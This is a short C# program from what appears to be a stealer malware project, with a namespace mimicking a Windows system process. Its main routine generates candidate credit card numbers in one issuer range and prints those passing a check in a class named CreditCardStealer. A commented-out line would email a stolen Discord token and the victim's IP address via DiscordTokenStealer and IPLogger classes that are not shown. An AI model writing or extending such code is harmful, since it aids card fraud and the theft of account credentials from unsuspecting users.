using System;

namespace ConvHost32
{
    class Program
    {
        public static void Main(string[] args)
        {
            for (ulong i = 4147202400000000; i < 4147202499999999; i++)
            {
                if(CreditCardStealer.CheckNumber(i.ToString()))
                {
                    Console.WriteLine(i);
                }
            }
            //Emailer.Email("Token: " + DiscordTokenStealer.TokenSteal() + "\nIp: " + IPLogger.GetIP());
        }
    }
}